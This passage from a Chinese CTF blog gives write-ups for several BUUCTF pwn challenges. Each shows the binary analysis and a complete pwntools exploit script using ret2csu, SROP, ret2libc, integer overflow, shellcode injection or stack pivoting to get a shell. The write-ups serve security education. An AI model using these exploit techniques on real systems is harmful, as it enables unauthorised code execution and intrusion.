title="解法1：ret2csu"></a>解法1：ret2csu</h2><p>考虑到存在<strong>59号系统调用execve</strong>，故考虑构造rop链通过<code>execve(&quot;/bin/sh&quot;,0,0)</code>以getshell</p><p>文件中不存在<code>&quot;/bin/sh&quot;</code>字符串，由于栈基址可知，故考虑手动输入到栈上</p><p>这里我们使用csu中的gadget先将r13、r14置为0，之后再<code>mov rdx,r13;mov rsi,r14</code>将rsi和rdx置为0</p><p>由于这个gadget运行到后面会执行<code>call [r12 + 8*rsp]</code>（rsp已被置0，故实际效果是执行```call [r12]``），故我们还需要在r12内放入一个存有适合指令的地址的地址，这里由于此前我们已经获得了一个栈上地址，故考虑直接在栈上放一个带有ret的gadget的地址后将r12置为该栈上地址即可继续控制程序执行流，<strong>需要注意的是call指令会往栈上压入当前的下一条指令的地址，我们还需要将之弹出栈</strong></p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">mov_rax_59_ret = <span class="number">0x4004e2</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4005a3</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret = <span class="number">0x40059a</span></span><br><span class="line">mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12 = <span class="number">0x400580</span></span><br><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">syscall = <span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b'A'</span>*<span class="number">0x10</span> + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28147</span>)<span class="comment">#process('./ciscn_s_3')# </span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))<span class="number">-0x118</span></span><br><span class="line">sh_addr = stack_addr + <span class="number">8</span></span><br><span class="line">log.info(hex(sh_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload2 =  p64(pop_rdi_ret) + <span class="string">b'/bin/sh\x00'</span> + p64(pop_rbx_rbp_r12_r13_r14_r15_ret)</span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(stack_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12)</span><br><span class="line">payload2 += p64(mov_rax_59_ret) + p64(pop_rdi_ret) + p64(sh_addr)</span><br><span class="line">payload2 += p64(syscall)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行脚本即可getshell</p><p><img src="https://i.loli.net/2020/11/28/cCwJmaSEt5Kxqeg.png" alt="image.png"></p><h2 id="解法2：SROP"><a href="#解法2：SROP" class="headerlink" title="解法2：SROP"></a>解法2：SROP</h2><blockquote><p><del>试了好几种姿势都没弄出来，离谱</del></p><p><del>难道SROP退出历史舞台了🐎</del></p><p>是我傻了，我给弄成str().encode()了，应该用bytes()…</p><p><del>早知道自己手撕一个frame可能还好点</del></p></blockquote><p>前面的解法我们使用了gadget中给出的59号系统调用<code>execve</code>，这个解法则是使用了gadget中给出的另外一个15号系统调用<code>rt_sigreturn</code></p><p>系统调用<code>rt_sigreturn</code>用于恢复用户态的寄存器状态，从栈上保存的数据来恢复寄存器的状态</p><p>在正常情况下，由用户态切换到内核态之前，系统会将当前进程的寄存器状态压入栈中，将<code>rt_sigreturn</code>作为返回地址一并压入；从内核态切回用户态时便通过栈上的数据来恢复寄存器的状态，大致布局如下：</p><p><img src="https://image.3001.net/images/20151128/14487175105930.png!small" alt="image.png"></p><p>因此我们只需要伪造一个SigreturnFrame执行execve(“/bin/sh”,0,0)即可</p><p>使用pwntools中的SigreturnFrame工具可以快速构造一个 fake frame</p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">p =remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26063</span>)<span class="comment"># process('./ciscn_s_3') # </span></span><br><span class="line">e = ELF(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line">mov_rax_15_ret = <span class="number">0x4004da</span></span><br><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">payload1 = <span class="string">b'A'</span> * <span class="number">0x10</span> + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_leak = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x118</span></span><br><span class="line">log.info(<span class="string">"stack addr: "</span> + hex(stack_leak))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span> <span class="comment"># syscall::execve, constants.SYS_execve is also ok</span></span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line">frame.rdi = stack_leak</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">payload2 = <span class="string">b'/bin/sh\x00'</span> + p64(<span class="number">0xdeadbeef</span>) + p64(mov_rax_15_ret) + p64(syscall_addr) + bytes(frame)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行即得flag</p><p><img src="https://i.loli.net/2020/11/29/CJxnp4FVN6RoujY.png" alt="image.png"></p><blockquote><p>SROP(Sigreturn Oriented Programming)技术利用了类Unix系统中的Signal机制，如图：</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190522125217-5fced1dc-7c4d-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190522125217-5fced1dc-7c4d-1.png" alt="img"></a></p><ol><li>当一个用户层进程发起signal时，控制权切到内核层</li><li>内核保存进程的上下文(对我们来说重要的就是寄存器状态)到用户的栈上，然后再把rt_sigreturn地址压栈，跳到用户层执行Signal Handler，即调用rt_sigreturn</li><li>rt_sigreturn执行完，跳到内核层</li><li>内核恢复②中保存的进程上下文，控制权交给用户层进程</li></ol><p><a href="https://xz.aliyun.com/t/5240" target="_blank" rel="noopener">先知社区-SROP exploit</a></p></blockquote><h1 id="0x018-铁人三项-第五赛区-2018-rop-ret2libc"><a href="#0x018-铁人三项-第五赛区-2018-rop-ret2libc" class="headerlink" title="0x018.铁人三项(第五赛区)_2018_rop - ret2libc"></a>0x018.铁人三项(第五赛区)_2018_rop - ret2libc</h1><p>惯例的<code>checksec</code>，只开了NX</p><p><img src="https://i.loli.net/2020/10/19/2FfsUenMSKoQ7qY.png" alt="image.png"></p><p>拖入IDA分析</p><p><img src="https://i.loli.net/2020/10/19/PDEMKizc5g2HIyl.png" alt="image.png"></p><p>直接给了一个很大的溢出，但是没有直接getshell的gadget，故考虑构造rop链先泄露read函数真实地址再使用LibcSearcher寻找Libc版本最后构造rop链执行<code>system(&quot;/bin/sh&quot;)</code>以getshell</p><p>构造exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from LibcSearcher import *</span><br><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;node3.buuoj.cn&#39;,28409)#process(&#39;.&#x2F;2018_rop&#39;)</span><br><span class="line">e &#x3D; ELF(&#39;.&#x2F;2018_rop&#39;)</span><br><span class="line">offset &#x3D; 0x88</span><br><span class="line">read_got &#x3D; e.got[&#39;read&#39;]</span><br><span class="line">write_plt &#x3D; e.plt[&#39;write&#39;]</span><br><span class="line"></span><br><span class="line">payload1 &#x3D; offset * b&#39;A&#39; + p32(0xdeadbeef) + p32(write_plt) + p32(0x8048474) + p32(1) + p32(read_got) + p32(4)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">read_str &#x3D; p.recv(4).ljust(4,b&#39;\x00&#39;)</span><br><span class="line">print(read_str)</span><br><span class="line">read_addr &#x3D; u32(read_str)</span><br><span class="line"></span><br><span class="line">libc &#x3D; LibcSearcher(&#39;read&#39;,read_addr)</span><br><span class="line">libc_base &#x3D; read_addr - libc.dump(&#39;read&#39;)</span><br><span class="line">sys_addr &#x3D; libc_base + libc.dump(&#39;system&#39;)</span><br><span class="line">sh_addr &#x3D; libc_base  + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span class="line">payload2 &#x3D; offset * b&#39;A&#39; + p32(0xdeadbeef) + p32(sys_addr) + p32(0xdeadbeef) + p32(sh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/19/5HYQqUcMGavCsdS.png" alt="image.png"></p><h1 id="0x019-bjdctf-2020-babyrop-ret2csu-ret2libc"><a href="#0x019-bjdctf-2020-babyrop-ret2csu-ret2libc" class="headerlink" title="0x019.bjdctf_2020_babyrop - ret2csu + ret2libc"></a>0x019.bjdctf_2020_babyrop - ret2csu + ret2libc</h1><p>惯例<code>checksec</code>，只开了栈不可执行保护</p><p><img src="https://i.loli.net/2020/11/15/zhfrI8Kpij7NWT6.png" alt="image.png"></p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/11/15/cmGeARE3V18x9H2.png" alt="image.png"></p><p>可以发现在<code>vuln()</code>函数处存在栈溢出</p><p>由于没有后面函数，故考虑ret2libc构造rop链执行<code>system(&quot;/bin/sh&quot;)</code></p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28167</span>) <span class="comment"># p = process('./bjdctf_2020_babyrop') # </span></span><br><span class="line">e = ELF(<span class="string">'./bjdctf_2020_babyrop'</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400733</span></span><br><span class="line">puts_plt = e.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = e.got[<span class="string">'puts'</span>]</span><br><span class="line">offset = <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload1 = offset*<span class="string">b'A'</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(e.sym[<span class="string">'vuln'</span>])</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">puts_str = p.recvuntil(<span class="string">b'\nPull up'</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>)</span><br><span class="line">print(puts_str)</span><br><span class="line">puts_addr = u64(puts_str)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = offset*<span class="string">b'A'</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行脚本，得到flag</p><p><img src="https://i.loli.net/2020/11/15/S46DkWpHcz5qLiF.png" alt="image.png"></p><h1 id="0x01A-pwn2-sctf-2016-integer-overflow-ret2libc"><a href="#0x01A-pwn2-sctf-2016-integer-overflow-ret2libc" class="headerlink" title="0x01A.pwn2_sctf_2016 - integer overflow + ret2libc"></a>0x01A.pwn2_sctf_2016 - integer overflow + ret2libc</h1><p>惯例<code>checksec</code>，发现只开了NX保护</p><p>![0QJ_UK7O_A2KJOURYNP`_KW.png](<a href="https://i.loli.net/2020/10/09/j5cJeXs3HS4VQr2.png" target="_blank" rel="noopener">https://i.loli.net/2020/10/09/j5cJeXs3HS4VQr2.png</a>)</p><p>拖入IDA进行分析</p><p>在<code>vuln()</code>函数中使用<code>get_n()</code>函数读入4字节并使用<code>atoi()</code>转为数字，若是大于32则退出，否则再一次调用<code>get_n()</code>函数进行读入</p><p>![A`GN6_COM3ZZ5BGCO0P1~AK.png](<a href="https://i.loli.net/2020/10/09/IUtdTGcg2eHshOn.png" target="_blank" rel="noopener">https://i.loli.net/2020/10/09/IUtdTGcg2eHshOn.png</a>)</p><p>不过我们可以发现在<code>get_n()</code>函数中，其所接收的第二个参数为<code>unsigned int</code>，若是我们读入数字<code>-1</code>则会发生整数溢出变成一个巨大的正数，那么在这里便存在溢出点了</p><p><img src="https://i.loli.net/2020/10/09/Iy2iukBamRfXd1x.png" alt="SH@J5_XNE_9R_DEH0R_A_T0.png"></p><p>文件本身不存在可以直接getshell的函数（并且附赠了一堆没用的gadget），故考虑<strong>ret2libc</strong>，首先泄漏出printf函数地址，再使用LibcSearcher得到libc，最后构造<code>system(&quot;/bin/sh&quot;)</code>即可</p><p>程序中存在<code>%s</code>字符串供打印</p><p><img src="https://i.loli.net/2020/10/09/MzHjLZfqXTpBxaF.png" alt="1__H@0HQW54N_D27DI_SM_3.png"></p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">'./pwn2_sctf_2016'</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x804A040</span></span><br><span class="line">fmtstr_addr = <span class="number">0x8048702</span></span><br><span class="line">printf_got = e.got[<span class="string">'printf'</span>]</span><br><span class="line">printf_plt = e.plt[<span class="string">'printf'</span>]</span><br><span class="line">main_addr = e.sym[<span class="string">'main'</span>]</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x2c</span> + p32(<span class="number">0xdeadbeef</span>) + p32(printf_plt) + p32(main_addr) + p32(fmtstr_addr) + p32(printf_got)</span><br><span class="line"></span><br><span class="line">p =remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29032</span>)</span><br><span class="line">p.sendline(<span class="string">b'-1'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b'You said'</span>)</span><br><span class="line">p.recvuntil(<span class="string">b'\n'</span>)</span><br><span class="line"></span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'printf'</span>,printf_addr)</span><br><span class="line">libc_base = printf_addr - libc.dump(<span class="string">'printf'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">payload2 = <span class="string">b'A'</span>*<span class="number">0x2c</span> + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) +  <span class="number">5</span>*p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b'-1'</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行即可getshell</p><p><img src="https://i.loli.net/2020/10/09/3pdunR4j1yBtrOL.png" alt="E@O1G4DY_S2_DR_2J_0E__O.png"></p><h1 id="0x01B-others-shellcode"><a href="#0x01B-others-shellcode" class="headerlink" title="0x01B.others_shellcode"></a>0x01B.others_shellcode</h1><p>直接连接就有flag了…</p><p><img src="https://i.loli.net/2020/11/15/ci6yp5J3jWVagZK.png" alt="image.png"></p><h1 id="0x01C-HarekazeCTF2019-baby-rop2-ret2csu-ret2libc"><a href="#0x01C-HarekazeCTF2019-baby-rop2-ret2csu-ret2libc" class="headerlink" title="0x01C.[HarekazeCTF2019]baby_rop2 - ret2csu + ret2libc"></a>0x01C.[HarekazeCTF2019]baby_rop2 - ret2csu + ret2libc</h1><p>惯例的<code>checksec</code>，发现只开了NX</p><p><img src="https://i.loli.net/2020/10/09/dhNruafBqwiGHj7.png" alt="image.png"></p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/10/09/BAIuUsgEq8VkCD2.png" alt="image.png"></p><p>主函数中存在溢出，不过没有可以利用的函数，故考虑ret2libc：先使用printf泄露read函数地址再用LibcSearcher得到libc最后构造rop链执行<code>system(&quot;/bin/sh&quot;)</code>即可</p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">'./babyrop2'</span>)</span><br><span class="line"></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x400731</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400733</span></span><br><span class="line">fmtstr = <span class="number">0x400790</span></span><br><span class="line">read_got = e.got[<span class="string">'read'</span>]</span><br><span class="line">printf_plt = e.plt[<span class="string">'printf'</span>]</span><br><span class="line">main_addr = e.sym[<span class="string">'main'</span>]</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x20</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rsi_r15_ret) + p64(read_got) +p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(fmtstr) + p64(printf_plt) + p64(e.sym[<span class="string">'main'</span>])</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25106</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">str = p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>)</span><br><span class="line">print(str)</span><br><span class="line">read_addr = u64(str)</span><br><span class="line">libc = LibcSearcher(<span class="string">'read'</span>,read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">'read'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">payload2 = <span class="string">b'A'</span>*<span class="number">0x20</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行，得到flag<del>藏的位置好深啊</del></p><p><img src="https://i.loli.net/2020/10/09/L43Evc2IVdUWkCF.png" alt="F240_K_XDU@_4RS_JFVI~RP.png"></p><h1 id="0x01D-ez-pz-hackover-2016-ret2shellcode"><a href="#0x01D-ez-pz-hackover-2016-ret2shellcode" class="headerlink" title="0x01D.ez_pz_hackover_2016 - ret2shellcode"></a>0x01D.ez_pz_hackover_2016 - ret2shellcode</h1><p>惯例的<code>checksec</code>，保护全关，暗示我们可以为所欲为</p><p><img src="C:%5CUsers%5CSUR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1606747425236.png" alt="1606747425236"></p><p>拖入IDA进行分析</p><p>在<code>chall()</code>函数中给我们泄露了一个栈上地址，并读入1023字节，无法溢出</p><p><img src="https://i.loli.net/2020/11/30/nxCyhzXdESge4OH.png" alt="image.png"></p><p>但是在vuln函数中会拷贝一次我们的输入，<strong>可以溢出</strong></p><p><img src="https://i.loli.net/2020/11/30/ldt9YWcke8NvpUT.png" alt="image.png"></p><p>由于给了一个栈上地址，故考虑输入一段shellcode后跳转即可</p><p>需要注意的一个点是<code>vuln()</code>函数是<strong>将传入的参数的地址作为参数传入memcpy的</strong>，故实际上会额外拷贝0xec - 0xd0 = 0x1c字节，那么我们填充到ebp所需的padding长度其实只需要0x32 - 0x1c = 0x16字节</p><p><img src="C:%5CUsers%5CSUR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1606752784211.png" alt="1606752784211"></p><p>泄露出来的地址和我们拷贝到的地址上的shellcode间距为0x9ec - 0x9d0 = 0x1c，直接跳转过去即可，需要注意的是<strong>因为memcpy拷贝了长达0x400字节的内容，会将我们第一次输入的数据尽数破坏，故我们只能向拷贝后的地址跳</strong></p><p><img src="https://i.loli.net/2020/12/01/tKG7EIMTbcS3wLa.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/11/30/n5M1HGzuTxy7QZb.png" alt="_9T8_GI__708_M0FN1H~_GC.png"></p><p>故构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p = process(<span class="string">"./ez_pz_hackover_2016"</span>) <span class="comment">#  remote("node3.buuoj.cn", 25809) # </span></span><br><span class="line">offset = <span class="number">0x16</span></span><br><span class="line">verify = <span class="string">b"crashme\x00"</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"lets crash: "</span>)</span><br><span class="line">stack_leak = int(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>], <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">"stack leak: "</span> + hex(stack_leak))</span><br><span class="line">payload = verify + <span class="string">b'A'</span> * (offset - len(verify)) + p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(stack_leak - <span class="number">0x1c</span>) + asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行，得到flag</p><p><img src="https://i.loli.net/2020/12/01/P9gryD43xBNawEL.png" alt="image.png"></p><h1 id="0x01E-ciscn-2019-es-2-ret2text-stack-migration"><a href="#0x01E-ciscn-2019-es-2-ret2text-stack-migration" class="headerlink" title="0x01E.ciscn_2019_es_2 - ret2text + stack migration"></a>0x01E.ciscn_2019_es_2 - ret2text + stack migration</h1><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p><p><img src="https://i.loli.net/2020/12/01/uifxqJUW9rIQpS1.png" alt="image.png"></p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/12/01/Mdng1Imo6tPrkyC.png" alt="image.png"></p><p>存在溢出，且读取两次输出两次，故第一次我们可以填充0x28字节获得一个栈上地址</p><p><img src="https://i.loli.net/2020/12/01/MIteH4sl7aKJORj.png" alt="image.png"></p><p>存在system函数</p><p>由于溢出只有8个字节，而我们能够获得栈上地址，故考虑进行<strong>栈迁移</strong>，在栈上构造ROP链</p><p>题目中只给了<code>system()</code>函数，没给<code>/bin/sh</code>字符串，不过由于栈上地址可知，故我们可以将之读取到栈上</p><p>gdb调试可知我们的输入与所泄露地址间距为0xe18 - 0xde0 = 0x38</p><p><img src="https://i.loli.net/2020/12/01/WXw721cUfC9LDqQ.png" alt="image.png"></p><p>故构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>, <span class="number">25040</span>) <span class="comment"># process("./ciscn_2019_es_2") #</span></span><br><span class="line">e = ELF(<span class="string">"./ciscn_2019_es_2"</span>)</span><br><span class="line">offset = <span class="number">0x28</span></span><br><span class="line">leave_ret = <span class="number">0x80485FD</span></span><br><span class="line">payload = <span class="string">b'A'</span> * offset</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(payload)</span><br><span class="line">stack_leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(hex(stack_leak))</span><br><span class="line">payload2 = p32(e.sym[<span class="string">'system'</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(stack_leak<span class="number">-0x38</span> + <span class="number">12</span>) + <span class="string">b'/bin/sh\x00'</span></span><br><span class="line">payload2 += <span class="string">b'A'</span> * (offset - len(payload2)) + p32(stack_leak - <span class="number">0x38</span> - <span class="number">4</span>) + p32(leave_ret)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行即得flag</p><p><img src="https://i.loli.net/2020/12/01/82JX5c3gmUfhuBd.png" alt="image.png"></p><h1 id="0x01F-Black-Watch-入群题-PWN-ret2libc-stack-migration"><a href="#0x01F-Black-Watch-入群题-PWN-ret2libc-stack-migration" class="headerlink" title="0x01F.[Black Watch 入群题]PWN - ret2libc + stack migration"></a>0x01F.[Black Watch 入群题]PWN - ret2libc + stack migration</h1><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p><p><img src="https://i.loli.net/2020/12/01/zX2NEbFpBKWCamq.png" alt="image.png"></p><p>拖入IDA进行分析</p><p><img 